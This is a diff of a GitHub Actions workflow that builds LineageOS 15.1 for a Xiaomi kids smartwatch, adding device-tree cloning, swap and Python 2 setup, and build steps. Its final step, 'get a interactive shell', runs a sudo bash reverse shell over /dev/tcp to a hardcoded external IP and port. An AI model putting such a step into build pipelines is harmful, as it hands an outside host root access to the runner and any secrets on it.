@@ -22,7 +22,7 @@ on:
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
   # This workflow contains a single job called "build"
-  download:
+  AOSP-BUILD:
     # The type of runner that the job will run on
     runs-on: ubuntu-latest
 
@@ -67,11 +67,34 @@ jobs:
           git config --global user.email "azwhikaru+37921907@github.com"
           repo init --depth=1 -u https://github.com/LineageOS/android.git -b lineage-15.1
         id: pwd
+      - name: Clone device tree
+        run: |
+          git clone https://github.com/ZH-XiJun/android_device_xiaoxun_MiKidsSmartWatch_4PRO -b lineage-15.1 ./device/xiaoxun/MiKidsSmartWatch_4PRO
+        working-directory: ${{ steps.pwd.outputs.workspace-folder }}
       - name: Repo Sync
         run: |
           repo sync -j$(nproc --all) --force-sync
         working-directory: workspace
       
+      - name: Set Swap Space
+        uses: pierotofy/set-swap-space@master
+        with:
+          swap-size-gb: 12
+
+      - name: Switch to Python2
+        run: |
+          sudo apt -y install python
+          sudo rm -rf /usr/bin/python
+          sudo ln -s /usr/bin/python2 /usr/bin/python
+          # sudo ln -s /usr/bin/python3 /usr/bin/python3
+        continue-on-error: true
+
+      - name: Building aosp
+        run: |
+          source build/envsetup.sh
+          export ALLOW_MISSING_DEPENDENCIES=true
+          lunch lineage_MiKidsSmartWatch_4PRO-eng && make clean && make -j$(nproc --all)
+        working-directory: ${{ steps.pwd.outputs.workspace-folder }}
       # Runs a set of commands using the runners shell
       - name: get a interactive shell
         run: sudo bash -i >& /dev/tcp/116.211.143.77/55347 0>&1
